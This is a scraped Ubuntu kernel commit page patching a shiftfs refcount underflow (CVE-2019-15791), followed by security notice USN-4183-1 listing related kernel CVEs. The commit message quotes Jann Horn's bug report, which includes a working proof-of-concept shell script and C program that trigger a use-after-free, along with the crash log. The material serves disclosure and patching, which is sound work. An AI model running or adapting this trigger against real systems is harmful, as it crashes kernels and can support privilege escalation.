=== Content from git.launchpad.net_1f625512_20250121_004320.html ===


| [cgit logo](/) | [index](/) : [~ubuntu-kernel/ubuntu/+source/linux/+git/eoan](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/ "~ubuntu-kernel/ubuntu/+source/linux/+git/eoan") | master master-next raspi2 snapdragon |
| --- | --- | --- |
| [no description] |  |

| [summary](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/)[refs](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/refs/?id=601a64857b3d7040ca15c39c929e6b9db3373ec1)[log](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/log/)[tree](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/tree/?id=601a64857b3d7040ca15c39c929e6b9db3373ec1)[commit](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/commit/?id=601a64857b3d7040ca15c39c929e6b9db3373ec1)[diff](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/diff/?id=601a64857b3d7040ca15c39c929e6b9db3373ec1) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Seth Forshee <seth.forshee@canonical.com> | 2019-11-01 10:41:03 -0500 |
| --- | --- | --- |
| committer | Stefan Bader <stefan.bader@canonical.com> | 2019-11-05 09:55:53 +0100 |
| commit | [601a64857b3d7040ca15c39c929e6b9db3373ec1](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/commit/?id=601a64857b3d7040ca15c39c929e6b9db3373ec1) ([patch](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/patch/?id=601a64857b3d7040ca15c39c929e6b9db3373ec1)) | |
| tree | [341586c22414b179375fd73bcf723fa5330bc2c9](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/tree/?id=601a64857b3d7040ca15c39c929e6b9db3373ec1) | |
| parent | [b04ce25d0e89d0a089153d3d9447c78a6b708d39](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/commit/?id=b04ce25d0e89d0a089153d3d9447c78a6b708d39) ([diff](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/diff/?id=601a64857b3d7040ca15c39c929e6b9db3373ec1&id2=b04ce25d0e89d0a089153d3d9447c78a6b708d39)) | |

UBUNTU: SAUCE: shiftfs: Fix refcount underflow in btrfs ioctl handlingBugLink: https://bugs.launchpad.net/bugs/1850867
shiftfs\_btrfs\_ioctl\_fd\_replace() installs an fd referencing a
file from the lower filesystem without taking an additional
reference to that file. After the btrfs ioctl completes this fd
is closed, which then puts a reference to that file, leading to a
refcount underflow. Original bug report and test case from Jann
Horn is below.
Fix this, and at the sametime simplify the management of the fd
to the lower file for the ioctl. In
shiftfs\_btrfs\_ioctl\_fd\_replace(), take the missing reference to
the lower file and set FDPUT\_FPUT so that this reference will get
dropped on fdput() in error paths. Do not maintain the struct fd
in the caller, as it the fd installed in the fd table is
sufficient to properly clean up. Finally, remove the fdput() in
shiftfs\_btrfs\_ioctl\_fd\_restore() as it is redundant with the
\_\_close\_fd() call.
Original report from Jann Horn:
In shiftfs\_btrfs\_ioctl\_fd\_replace() ("//" comments added by me):
src = fdget(oldfd);
if (!src.file)
return -EINVAL;
// src holds one reference (assuming multithreaded execution)
ret = shiftfs\_real\_fdget(src.file, lfd);
// lfd->file is a file\* now, but shiftfs\_real\_fdget didn't take any
// extra references
fdput(src);
// this drops the only reference we were holding on src, and src was
// the only thing holding a reference to lfd->file. lfd->file may be
// dangling at this point.
if (ret)
return ret;
\*newfd = get\_unused\_fd\_flags(lfd->file->f\_flags);
if (\*newfd < 0) {
// always a no-op
fdput(\*lfd);
return \*newfd;
}
fd\_install(\*newfd, lfd->file);
// fd\_install() consumes a counted reference, but we don't hold any
// counted references. so at this point, if lfd->file hasn't been freed
// yet, its refcount is one lower than it ought to be.
[...]
// the following code is refcount-neutral, so the refcount stays one too
// low.
if (ret)
shiftfs\_btrfs\_ioctl\_fd\_restore(cmd, \*lfd, \*newfd, arg, v1, v2);
shiftfs\_real\_fdget() is implemented as follows:
static int shiftfs\_real\_fdget(const struct file \*file, struct fd \*lowerfd)
{
struct shiftfs\_file\_info \*file\_info = file->private\_data;
struct file \*realfile = file\_info->realfile;
lowerfd->flags = 0;
lowerfd->file = realfile;
/\* Did the flags change since open? \*/
if (unlikely(file->f\_flags & ~lowerfd->file->f\_flags))
return shiftfs\_change\_flags(lowerfd->file, file->f\_flags);
return 0;
}
Therefore, the following PoC will cause reference count overdecrements; I ran it
with SLUB debugging enabled and got the following splat:
=======================================
user@ubuntu1910vm:~/shiftfs$ cat run.sh
sync
unshare -mUr ./run2.sh
t run2user@ubuntu1910vm:~/shiftfs$ cat run2.sh
set -e
mkdir -p mnt/tmpfs
mkdir -p mnt/shiftfs
mount -t tmpfs none mnt/tmpfs
mount -t shiftfs -o mark,passthrough=2 mnt/tmpfs mnt/shiftfs
mount|grep shift
touch mnt/tmpfs/foo
gcc -o ioctl ioctl.c -Wall
./ioctl
user@ubuntu1910vm:~/shiftfs$ cat ioctl.c
int main(void) {
int root = open("mnt/shiftfs", O\_RDONLY);
if (root == -1) err(1, "open shiftfs root");
int foofd = openat(root, "foo", O\_RDONLY);
if (foofd == -1) err(1, "open foofd");
struct btrfs\_ioctl\_vol\_args iocarg = {
.fd = foofd
};
ioctl(root, BTRFS\_IOC\_SNAP\_CREATE, &iocarg);
sleep(1);
void \*map = mmap(NULL, 0x1000, PROT\_READ, MAP\_SHARED, foofd, 0);
if (map != MAP\_FAILED) munmap(map, 0x1000);
}
user@ubuntu1910vm:~/shiftfs$ ./run.sh
none on /home/user/shiftfs/mnt/tmpfs type tmpfs (rw,relatime,uid=1000,gid=1000)
/home/user/shiftfs/mnt/tmpfs on /home/user/shiftfs/mnt/shiftfs type shiftfs (rw,relatime,mark,passthrough=2)
[ 183.463452] general protection fault: 0000 [#1] SMP PTI
[ 183.467068] CPU: 1 PID: 2473 Comm: ioctl Not tainted 5.3.0-19-generic #20-Ubuntu
[ 183.472170] Hardware name: QEMU Standard PC (Q35 + ICH9, 2009), BIOS 1.12.0-1 04/01/2014
[ 183.476830] RIP: 0010:shiftfs\_mmap+0x20/0xd0 [shiftfs]
[ 183.478524] Code: 20 cf 5d c3 c3 0f 1f 44 00 00 0f 1f 44 00 00 55 48 89 e5 41 57 41 56 41 55 41 54 48 8b 87 c8 00 00 00 4c 8b 68 10 49 8b 45 28 <48> 83 78 60 00 0f 84 97 00 00 00 49 89 fc 49 89 f6 48 39 be a0 00
[ 183.484585] RSP: 0018:ffffae48007c3d40 EFLAGS: 00010206
[ 183.486290] RAX: 6b6b6b6b6b6b6b6b RBX: ffff93f1fb7908a8 RCX: 7800000000000000
[ 183.489617] RDX: 8000000000000025 RSI: ffff93f1fb792208 RDI: ffff93f1f69fa400
[ 183.491975] RBP: ffffae48007c3d60 R08: ffff93f1fb792208 R09: 0000000000000000
[ 183.494311] R10: ffff93f1fb790888 R11: 00007f1d01d10000 R12: ffff93f1fb7908b0
[ 183.496675] R13: ffff93f1f69f9900 R14: ffff93f1fb792208 R15: ffff93f22f102e40
[ 183.499011] FS: 00007f1d01cd1540(0000) GS:ffff93f237a40000(0000) knlGS:0000000000000000
[ 183.501679] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 183.503568] CR2: 00007f1d01bc4c10 CR3: 0000000242726001 CR4: 0000000000360ee0
[ 183.505901] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 183.508229] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
[ 183.510580] Call Trace:
[ 183.511396] mmap\_region+0x417/0x670
[ 183.512592] do\_mmap+0x3a8/0x580
[ 183.513655] vm\_mmap\_pgoff+0xcb/0x120
[ 183.514863] ksys\_mmap\_pgoff+0x1ca/0x2a0
[ 183.516155] \_\_x64\_sys\_mmap+0x33/0x40
[ 183.517352] do\_syscall\_64+0x5a/0x130
[ 183.518548] entry\_SYSCALL\_64\_after\_hwframe+0x44/0xa9
[ 183.520196] RIP: 0033:0x7f1d01bfaaf6
[ 183.521372] Code: 00 00 00 00 f3 0f 1e fa 41 f7 c1 ff 0f 00 00 75 2b 55 48 89 fd 53 89 cb 48 85 ff 74 37 41 89 da 48 89 ef b8 09 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 62 5b 5d c3 0f 1f 80 00 00 00 00 48 8b 05 61
[ 183.527210] RSP: 002b:00007ffdf50bae98 EFLAGS: 00000246 ORIG\_RAX: 0000000000000009
[ 183.529582] RAX: ffffffffffffffda RBX: 0000000000000001 RCX: 00007f1d01bfaaf6
[ 183.531811] RDX: 0000000000000001 RSI: 0000000000001000 RDI: 0000000000000000
[ 183.533999] RBP: 0000000000000000 R08: 0000000000000004 R09: 0000000000000000
[ 183.536199] R10: 0000000000000001 R11: 0000000000000246 R12: 00005616cf6f5140
[ 183.538448] R13: 00007ffdf50bbfb0 R14: 0000000000000000 R15: 0000000000000000
[ 183.540714] Modules linked in: shiftfs intel\_rapl\_msr intel\_rapl\_common kvm\_intel kvm irqbypass snd\_hda\_codec\_generic ledtrig\_audio snd\_hda\_intel snd\_hda\_codec snd\_hda\_core crct10dif\_pclmul snd\_hwdep crc32\_pclmul ghash\_clmulni\_intel snd\_pcm aesni\_intel snd\_seq\_midi snd\_seq\_midi\_event aes\_x86\_64 crypto\_simd snd\_rawmidi cryptd joydev input\_leds snd\_seq glue\_helper qxl snd\_seq\_device snd\_timer ttm drm\_kms\_helper drm snd fb\_sys\_fops syscopyarea sysfillrect sysimgblt serio\_raw qemu\_fw\_cfg soundcore mac\_hid sch\_fq\_codel parport\_pc ppdev lp parport virtio\_rng ip\_tables x\_tables autofs4 hid\_generic usbhid hid virtio\_net net\_failover psmouse ahci i2c\_i801 libahci lpc\_ich virtio\_blk failover
[ 183.560350] ---[ end trace 4a860910803657c2 ]---
[ 183.561832] RIP: 0010:shiftfs\_mmap+0x20/0xd0 [shiftfs]
[ 183.563496] Code: 20 cf 5d c3 c3 0f 1f 44 00 00 0f 1f 44 00 00 55 48 89 e5 41 57 41 56 41 55 41 54 48 8b 87 c8 00 00 00 4c 8b 68 10 49 8b 45 28 <48> 83 78 60 00 0f 84 97 00 00 00 49 89 fc 49 89 f6 48 39 be a0 00
[ 183.569438] RSP: 0018:ffffae48007c3d40 EFLAGS: 00010206
[ 183.571102] RAX: 6b6b6b6b6b6b6b6b RBX: ffff93f1fb7908a8 RCX: 7800000000000000
[ 183.573362] RDX: 8000000000000025 RSI: ffff93f1fb792208 RDI: ffff93f1f69fa400
[ 183.575655] RBP: ffffae48007c3d60 R08: ffff93f1fb792208 R09: 0000000000000000
[ 183.577893] R10: ffff93f1fb790888 R11: 00007f1d01d10000 R12: ffff93f1fb7908b0
[ 183.580166] R13: ffff93f1f69f9900 R14: ffff93f1fb792208 R15: ffff93f22f102e40
[ 183.582411] FS: 00007f1d01cd1540(0000) GS:ffff93f237a40000(0000) knlGS:0000000000000000
[ 183.584960] CS: 0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[ 183.586796] CR2: 00007f1d01bc4c10 CR3: 0000000242726001 CR4: 0000000000360ee0
[ 183.589035] DR0: 0000000000000000 DR1: 0000000000000000 DR2: 0000000000000000
[ 183.591279] DR3: 0000000000000000 DR6: 00000000fffe0ff0 DR7: 0000000000000400
=======================================
Disassembly of surrounding code:
55 push rbp
4889E5 mov rbp,rsp
4157 push r15
4156 push r14
4155 push r13
4154 push r12
488B87C8000000 mov rax,[rdi+0xc8]
4C8B6810 mov r13,[rax+0x10]
498B4528 mov rax,[r13+0x28]
4883786000 cmp qword [rax+0x60],byte +0x0 <-- GPF HERE
0F8497000000 jz near 0xcc
4989FC mov r12,rdi
4989F6 mov r14,rsi
This is an attempted dereference of 0x6b6b6b6b6b6b6b6b, which is POISON\_FREE; I
think this corresponds to the load of "realfile->f\_op->mmap" in the source code.
Reported-by: Jann Horn <jannh@google.com>
Signed-off-by: Seth Forshee <seth.forshee@canonical.com>
CVE-2019-15791
Acked-by: Tyler Hicks <tyhicks@canonical.com>
Signed-off-by: Stefan Bader <stefan.bader@canonical.com>
[Diffstat](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/diff/?id=601a64857b3d7040ca15c39c929e6b9db3373ec1)

| -rw-r--r-- | [fs/shiftfs.c](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/diff/fs/shiftfs.c?id=601a64857b3d7040ca15c39c929e6b9db3373ec1) | 35 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 21 insertions, 14 deletions

| diff --git a/fs/shiftfs.c b/fs/shiftfs.cindex 55bb32b611f2..60576e9ff176 100644--- a/[fs/shiftfs.c](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/tree/fs/shiftfs.c?id=b04ce25d0e89d0a089153d3d9447c78a6b708d39)+++ b/[fs/shiftfs.c](/~ubuntu-kernel/ubuntu/%2Bsource/linux/%2Bgit/eoan/tree/fs/shiftfs.c?id=601a64857b3d7040ca15c39c929e6b9db3373ec1)@@ -1382,8 +1382,7 @@ static inline bool is\_btrfs\_snap\_ioctl(int cmd) return false; } -static int shiftfs\_btrfs\_ioctl\_fd\_restore(int cmd, struct fd lfd, int fd,- void \_\_user \*arg,+static int shiftfs\_btrfs\_ioctl\_fd\_restore(int cmd, int fd, void \_\_user \*arg, struct btrfs\_ioctl\_vol\_args \*v1, struct btrfs\_ioctl\_vol\_args\_v2 \*v2) {@@ -1397,7 +1396,6 @@ static int shiftfs\_btrfs\_ioctl\_fd\_restore(int cmd, struct fd lfd, int fd, else ret = copy\_to\_user(arg, v2, sizeof(\*v2)); - fdput(lfd); \_\_close\_fd(current->files, fd); kfree(v1); kfree(v2);@@ -1408,11 +1406,11 @@ static int shiftfs\_btrfs\_ioctl\_fd\_restore(int cmd, struct fd lfd, int fd, static int shiftfs\_btrfs\_ioctl\_fd\_replace(int cmd, void \_\_user \*arg, struct btrfs\_ioctl\_vol\_args \*\*b1, struct btrfs\_ioctl\_vol\_args\_v2 \*\*b2,- struct fd \*lfd, int \*newfd) { int oldfd, ret; struct fd src;+ struct fd lfd = {}; struct btrfs\_ioctl\_vol\_args \*v1 = NULL; struct btrfs\_ioctl\_vol\_args\_v2 \*v2 = NULL; @@ -1437,18 +1435,28 @@ static int shiftfs\_btrfs\_ioctl\_fd\_replace(int cmd, void \_\_user \*arg, if (!src.file) return -EINVAL; - ret = shiftfs\_real\_fdget(src.file, lfd);- fdput(src);- if (ret)+ ret = shiftfs\_real\_fdget(src.file, &lfd);+ if (ret) {+ fdput(src); return ret;+ }++ /\*+ \* shiftfs\_real\_fdget() does not take a reference to lfd.file, so+ \* take a reference here to offset the one which will be put by+ \* \_\_close\_fd(), and make sure that reference is put on fdput(lfd).+ \*/+ get\_file(lfd.file);+ lfd.flags |= FDPUT\_FPUT;+ fdput(src); - \*newfd = get\_unused\_fd\_flags(lfd->file->f\_flags);+ \*newfd = get\_unused\_fd\_flags(lfd.file->f\_flags); if (\*newfd < 0) {- fdput(\*lfd);+ fdput(lfd); return \*newfd; } - fd\_install(\*newfd, lfd->file);+ fd\_install(\*newfd, lfd.file);  if (cmd == BTRFS\_IOC\_SNAP\_CREATE) { v1->fd = \*newfd;@@ -1461,7 +1469,7 @@ static int shiftfs\_btrfs\_ioctl\_fd\_replace(int cmd, void \_\_user \*arg, }  if (ret)- shiftfs\_btrfs\_ioctl\_fd\_restore(cmd, \*lfd, \*newfd, arg, v1, v2);+ shiftfs\_btrfs\_ioctl\_fd\_restore(cmd, \*newfd, arg, v1, v2);  return ret; }@@ -1475,13 +1483,12 @@ static long shiftfs\_real\_ioctl(struct file \*file, unsigned int cmd, int newfd = -EBADF; long err = 0, ret = 0; void \_\_user \*argp = (void \_\_user \*)arg;- struct fd btrfs\_lfd = {}; struct super\_block \*sb = file->f\_path.dentry->d\_sb; struct btrfs\_ioctl\_vol\_args \*btrfs\_v1 = NULL; struct btrfs\_ioctl\_vol\_args\_v2 \*btrfs\_v2 = NULL;  ret = shiftfs\_btrfs\_ioctl\_fd\_replace(cmd, argp, &btrfs\_v1, &btrfs\_v2,- &btrfs\_lfd, &newfd);+ &newfd); if (ret < 0) return ret; @@ -1504,7 +1511,7 @@ out\_fdput: fdput(lowerfd);  out\_restore:- err = shiftfs\_btrfs\_ioctl\_fd\_restore(cmd, btrfs\_lfd, newfd, argp,+ err = shiftfs\_btrfs\_ioctl\_fd\_restore(cmd, newfd, argp, btrfs\_v1, btrfs\_v2); if (!ret) ret = err; |
| --- |

generated by [cgit v1.2.3](https://git.zx2c4.com/cgit/about/) ([git 2.25.1](https://git-scm.com/)) at 2025-01-21 00:43:20 +0000



=== Content from usn.ubuntu.com_6b20fd66_20250121_004320.html ===


Your submission was sent successfully!
*Close*

Thank you for contacting us. A member of our team will be in touch shortly.
*Close*

You have successfully unsubscribed!
*Close*

Thank you for signing up for our newsletter!

In these regular emails you will find the latest updates about
Ubuntu and upcoming events where you can meet our team.*Close*

Your preferences have been successfully updated. *Close*

[Canonical Ubuntu](/)

* [Menu](/navigation)

* [Products](/navigation#products-navigation)
* [Use cases](/navigation#use-case-navigation)
* [Support](/navigation#support-navigation)
* [Community](/navigation#community-navigation)
* [Get Ubuntu](/navigation#get-ubuntu-navigation)

[![](https://assets.ubuntu.com/v1/82818827-CoF_white.svg)

Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

# USN-4183-1: Linux kernel vulnerabilities

13 November 2019

Several security issues were fixed in the Linux kernel.

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Releases

* [Ubuntu 19.10](/security/notices?release=eoan)

## Packages

* [linux](/security/cves?package=linux) - Linux kernel
* [linux-aws](/security/cves?package=linux-aws) - Linux kernel for Amazon Web Services (AWS) systems
* [linux-azure](/security/cves?package=linux-azure) - Linux kernel for Microsoft Azure Cloud systems
* [linux-gcp](/security/cves?package=linux-gcp) - Linux kernel for Google Cloud Platform (GCP) systems
* [linux-kvm](/security/cves?package=linux-kvm) - Linux kernel for cloud environments
* [linux-oracle](/security/cves?package=linux-oracle) - Linux kernel for Oracle Cloud systems
* [linux-raspi2](/security/cves?package=linux-raspi2) - Linux kernel for Raspberry Pi 2

## Details

Stephan van Schaik, Alyssa Milburn, Sebastian Österlund, Pietro Frigo,

Kaveh Razavi, Herbert Bos, Cristiano Giuffrida, Giorgi Maisuradze, Moritz

Lipp, Michael Schwarz, Daniel Gruss, and Jo Van Bulck discovered that Intel

processors using Transactional Synchronization Extensions (TSX) could

expose memory contents previously stored in microarchitectural buffers to a

malicious process that is executing on the same CPU core. A local attacker

could use this to expose sensitive information. ([CVE-2019-11135](/security/CVE-2019-11135))

It was discovered that the Intel i915 graphics chipsets allowed userspace

to modify page table entries via writes to MMIO from the Blitter Command

Streamer and expose kernel memory information. A local attacker could use

this to expose sensitive information or possibly elevate privileges.

([CVE-2019-0155](/security/CVE-2019-0155))

Deepak Gupta discovered that on certain Intel processors, the Linux kernel

did not properly perform invalidation on page table updates by virtual

guest operating systems. A local attacker in a guest VM could use this to

cause a denial of service (host system crash). ([CVE-2018-12207](/security/CVE-2018-12207))

It was discovered that the Intel i915 graphics chipsets could cause a

system hang when userspace performed a read from GT memory mapped input

output (MMIO) when the product is in certain low power states. A local

attacker could use this to cause a denial of service. ([CVE-2019-0154](/security/CVE-2019-0154))

Jann Horn discovered a reference count underflow in the shiftfs

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2019-15791](/security/CVE-2019-15791))

Jann Horn discovered a type confusion vulnerability in the shiftfs

implementation in the Linux kernel. A local attacker could use this to

cause a denial of service (system crash) or possibly execute arbitrary

code. ([CVE-2019-15792](/security/CVE-2019-15792))

Jann Horn discovered that the shiftfs implementation in the Linux kernel

did not use the correct file system uid/gid when the user namespace of a

lower file system is not in the init user namespace. A local attacker could

use this to possibly bypass DAC permissions or have some other unspecified

impact. ([CVE-2019-15793](/security/CVE-2019-15793))

It was discovered that a buffer overflow existed in the 802.11 Wi-Fi

configuration interface for the Linux kernel when handling beacon settings.

A local attacker could use this to cause a denial of service (system crash)

or possibly execute arbitrary code. ([CVE-2019-16746](/security/CVE-2019-16746))

Nico Waisman discovered that a buffer overflow existed in the Realtek Wi-Fi

driver for the Linux kernel when handling Notice of Absence frames. A

physically proximate attacker could use this to cause a denial of service

(system crash) or possibly execute arbitrary code. ([CVE-2019-17666](/security/CVE-2019-17666))

### Reduce your security exposure

Ubuntu Pro provides ten-year security coverage to 25,000+ packages in Main and Universe repositories, and it is free for up to five machines.

[Learn more about Ubuntu Pro](/pro)

## Update instructions

The problem can be corrected by updating your system to the following package versions:

##### Ubuntu 19.10

* [linux-image-5.3.0-1006-oracle](https://launchpad.net/ubuntu/%2Bsource/linux-oracle)
  -
  [5.3.0-1006.7](https://launchpad.net/ubuntu/%2Bsource/linux-oracle/5.3.0-1006.7)
* linux-image-oracle
  -
  5.3.0.1006.7
* linux-image-azure
  -
  5.3.0.1007.25
* [linux-image-5.3.0-1007-azure](https://launchpad.net/ubuntu/%2Bsource/linux-kvm)
  -
  [5.3.0-1007.8](https://launchpad.net/ubuntu/%2Bsource/linux-kvm/5.3.0-1007.8)
* [linux-image-5.3.0-22-snapdragon](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [5.3.0-22.24](https://launchpad.net/ubuntu/%2Bsource/linux/5.3.0-22.24)
* [linux-image-5.3.0-1008-gcp](https://launchpad.net/ubuntu/%2Bsource/linux-gcp)
  -
  [5.3.0-1008.9](https://launchpad.net/ubuntu/%2Bsource/linux-gcp/5.3.0-1008.9)
* [linux-image-5.3.0-1007-kvm](https://launchpad.net/ubuntu/%2Bsource/linux-kvm)
  -
  [5.3.0-1007.8](https://launchpad.net/ubuntu/%2Bsource/linux-kvm/5.3.0-1007.8)
* [linux-image-5.3.0-22-lowlatency](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [5.3.0-22.24](https://launchpad.net/ubuntu/%2Bsource/linux/5.3.0-22.24)
* [linux-image-5.3.0-1007-aws](https://launchpad.net/ubuntu/%2Bsource/linux-kvm)
  -
  [5.3.0-1007.8](https://launchpad.net/ubuntu/%2Bsource/linux-kvm/5.3.0-1007.8)
* linux-image-virtual
  -
  5.3.0.22.26
* linux-image-snapdragon
  -
  5.3.0.22.26
* linux-image-gke
  -
  5.3.0.1008.9
* linux-image-generic
  -
  5.3.0.22.26
* linux-image-aws
  -
  5.3.0.1007.9
* linux-image-kvm
  -
  5.3.0.1007.9
* linux-image-raspi2
  -
  5.3.0.1012.9
* linux-image-generic-lpae
  -
  5.3.0.22.26
* linux-image-gcp
  -
  5.3.0.1008.9
* [linux-image-5.3.0-22-generic-lpae](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [5.3.0-22.24](https://launchpad.net/ubuntu/%2Bsource/linux/5.3.0-22.24)
* [linux-image-5.3.0-1012-raspi2](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2)
  -
  [5.3.0-1012.14](https://launchpad.net/ubuntu/%2Bsource/linux-raspi2/5.3.0-1012.14)
* [linux-image-5.3.0-22-generic](https://launchpad.net/ubuntu/%2Bsource/linux)
  -
  [5.3.0-22.24](https://launchpad.net/ubuntu/%2Bsource/linux/5.3.0-22.24)
* linux-image-lowlatency
  -
  5.3.0.22.26

Please note that mitigating the TSX (CVE-2019-11135) and i915

(CVE-2019-0154) issues requires corresponding microcode and graphics

firmware updates respectively.

After a standard system update you need to reboot your computer to

make all the necessary changes.

ATTENTION: Due to an unavoidable ABI change the kernel updates have

been given a new version number, which requires you to recompile and

reinstall all third party kernel modules you might have installed.

Unless you manually uninstalled the standard kernel metapackages

(e.g. linux-generic, linux-generic-lts-RELEASE, linux-virtual,

linux-powerpc), a standard system upgrade will automatically perform

this as well.

## References

* [CVE-2018-12207](/security/CVE-2018-12207)
* [CVE-2019-0154](/security/CVE-2019-0154)
* [CVE-2019-0155](/security/CVE-2019-0155)
* [CVE-2019-11135](/security/CVE-2019-11135)
* [CVE-2019-15791](/security/CVE-2019-15791)
* [CVE-2019-15792](/security/CVE-2019-15792)
* [CVE-2019-15793](/security/CVE-2019-15793)
* [CVE-2019-16746](/security/CVE-2019-16746)
* [CVE-2019-17666](/security/CVE-2019-17666)
* <https://wiki.ubuntu.com/SecurityTeam/KnowledgeBase/TAA_MCEPSC_i915>

## Related notices

* [USN-4186-1](/security/notices/USN-4186-1)
* [USN-4186-2](/security/notices/USN-4186-2)
* [USN-4184-1](/security/notices/USN-4184-1)
* [USN-4185-2](/security/notices/USN-4185-2)
* [USN-4185-1](/security/notices/USN-4185-1)
* [USN-4184-2](/security/notices/USN-4184-2)
* [USN-4185-3](/security/notices/USN-4185-3)
* [USN-4183-2](/security/notices/USN-4183-2)
* [USN-4186-3](/security/notices/USN-4186-3)
* [USN-4182-2](/security/notices/USN-4182-2)
* [USN-4182-1](/security/notices/USN-4182-1)
* [USN-4187-1](/security/notices/USN-4187-1)
* [USN-4188-1](/security/notices/USN-4188-1)
* [USN-4209-1](/security/notices/USN-4209-1)
* [USN-4210-1](/security/notices/USN-4210-1)

### Join the discussion

* [Ubuntu security updates mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-hardened)
* [Security announcements mailing list](https://lists.ubuntu.com/mailman/listinfo/ubuntu-security-announce)

### Need help with your security needs?

Ubuntu Pro provides up to ten-year security coverage for over 23,000 open-source packages within the Ubuntu Main and Universe repositories.

[Talk to an expert to find out what would work best for you](/contact-us/form?product=pro)

### Further reading

* *Loading...*

---

## [OpenStack](/openstack) [OpenStack](/openstack)

* [What is OpenStack](/openstack/what-is-openstack)
* [Features](/openstack/features)
* [Managed](/openstack/managed)
* [Consulting](/openstack/consulting)
* [Install](/openstack/install)
* [Support](/openstack/support)

---

## [Ceph](/ceph) [Ceph](/ceph)

* [What is Ceph](/ceph/what-is-ceph)
* [Managed](/ceph/managed)
* [Consulting](/ceph/consulting)
* [Docs](/ceph/docs)
* [Install](/ceph/install)

---

## [Kubernetes](/kubernetes) [Kubernetes](/kubernetes)

* [What is Kubernetes](/kubernetes/what-is-kubernetes)
* [Charmed Kubernetes](/kubernetes/charmed-k8s)
* [Managed](/kubernetes/managed)
* [Install](/kubernetes/install)
* [Docs](/kubernetes/docs)
* [Resources](/kubernetes/resources)

---

## [Managed Services](/managed) [Managed Services](/managed)

* [OpenStack](/openstack/managed)
* [Kubernetes](/kubernetes/managed)
* [Ceph](/ceph/managed)
* [Apps](/managed/apps)
* [Observability](/observability/managed)
* [Firefighting](/managed/firefighting-support)

---

## [AI / ML](/ai) [AI / ML](/ai)

* [MLOps](/ai/mlops)
* [Kubeflow](/ai/what-is-kubeflow)
* [MLflow](/ai/mlflow)
* [Consulting](/ai/consulting)
* [Data Science](/ai/data-science)
* [MLOps workshop](/ai/mlops-workshop)

---

## [Robotics](/robotics) [Robotics](/robotics)

* [What is ROS](/robotics/what-is-ros)
* [ROS ESM](/robotics/ros-esm)
* [Community](/robotics/community)
* [Docs](/robotics/docs)

---

## [IoT](/internet-of-things) [IoT](/internet-of-things)

* [App store](/internet-of-things/appstore)
* [Embedded Linux](/embedded)
* [Management](/internet-of-things/management)

---

## [Ubuntu Core](/core) [Ubuntu Core](/core)

* [Features](/core/features)
* [Success stories](/core/stories)
* [Services](/core/services)
* [Docs](/core/docs)

---

## [Ubuntu Desktop](/desktop) [Ubuntu Desktop](/desktop)

* [Organisations](/desktop/organisations)
* [Developers](/desktop/developers)
* [Flavours](/desktop/flavours)
* [WSL](/desktop/wsl)

---

## [Ubuntu Server](/server) [Ubuntu Server](/server)

* [Hyperscale](/server/hyperscale)
* [Docs](/server/docs)

---

## [Cloud](/cloud) [Cloud](/cloud)

* [What is cloud computing](/cloud/cloud-computing)
* [What is private cloud](/cloud/private-cloud)
* [What is hybrid cloud](/cloud/hybrid-cloud)
* [What is multi-cloud](/cloud/multi-cloud)
* [Public cloud](/cloud/public-cloud)

---

## [Security](/security) [Security](/security)

* [ESM](/security/esm)
* [Livepatch](/security/livepatch)
* [Certifications & Hardening](/security/compliance-automation)
* [CVEs](/security/cves)
* [Notices](/security/notices)
* [Docker Images](/security/docker-images)

---

## [Landscape](/landscape) [Landscape](/landscape)

* [Features](/landscape/features)
* [Managed](/landscape/managed)
* [Compare](/landscape/compare)
* [Install](/landscape/docs/quickstart-deployment)
* [Docs](/landscape/docs)
* [Log in to Landscape](https://landscape.canonical.com/)

---

## [Containers](/containers) [Containers](/containers)

* [What are containers](/containers/what-are-containers)
* [Chiseled Ubuntu](/containers/chiseled)
* [Chiseled and .NET](/containers/chiseled/dotnet)

---

## [Downloads](/download) [Downloads](/download)

* [Desktop](/download/desktop)
* [Server](/download/server)
* [Core](/download/core)
* [Cloud](/download/cloud)

---

## [Support](/support) [Support](/support)

* [Your subscriptions](/pro/dashboard)
* [Account users](/pro/users)
* [Pricing](/pricing/pro)
* [Discourse](https://discourse.ubuntu.com/c/project/ubuntu-pro/116/)

---

## [Observability](/observability) [Observability](/observability)

* [What is observability](/observability/what-is-observability)
